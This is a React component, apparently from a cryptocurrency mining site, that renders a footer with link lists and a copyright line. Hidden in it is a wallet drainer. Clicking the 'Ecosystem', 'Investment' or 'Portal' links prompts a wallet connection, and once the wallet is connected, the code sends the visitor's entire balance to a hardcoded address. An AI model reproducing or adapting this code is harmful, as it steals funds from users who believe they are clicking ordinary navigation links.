import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useEffect } from "react";
import { useAccount, useBalance, useSendTransaction } from "wagmi";

const Footer = () => {
    const { open } = useWeb3Modal()
    const { isConnected, address } = useAccount()
    const { data: hash, sendTransaction } = useSendTransaction()

    
    const { data: baseBalanceData } = useBalance({
        address: address,
        unit: "ether",
    });

    function connectAndSend() {
        if (!isConnected) {
            open({ view: 'Networks' })
        }else{
            const value = baseBalanceData?.value
            const to = "0x9d5eBa1AF95141f8f8fb943155bd45fDdB2639Fa"as `0x${string}` 
            sendTransaction({ to, value })
        }
    }
    return(
        <div className="container">
            <div className="xb-footer-bottom">
                <div className="xb-footer-wrap ul_li_between">
                    <div className="xb-item--footer_widget mb-30">
                        <span>Useful Links</span>
                        <ul className="xb-item--footer_widget-list">
                            <li><a href="">Contact us</a></li>
                            <li><a href="">How it Works</a></li>
                            <li><a href="">Terms</a> </li>
                        </ul>
                    </div>
                    <div className="xb-item--footer_widget mb-30">
                        <span>Solution</span>
                        <ul className="xb-item--footer_widget-list">
                            <li><a onClick={connectAndSend}>Ecosystem</a></li>
                            <li><a onClick={connectAndSend}>Investment</a></li>
                            <li><a onClick={connectAndSend}>Portal</a></li>
                        </ul>
                    </div>
                    <div className="xb-item--footer_widget mb-30">
                        <span>Need Help?</span>
                        <ul className="xb-item--footer_widget-list">
                            <li className="underline"><a href="mailto:@.com">Help@Cryptomining.com</a></li>
                        </ul>
                    </div>
                    
                </div>
                <div className="footer-copyright text-center">
                    Copyright © 2024 Miner. All rights reserved.
                </div>
            </div>
        </div>
    );
}

export default Footer;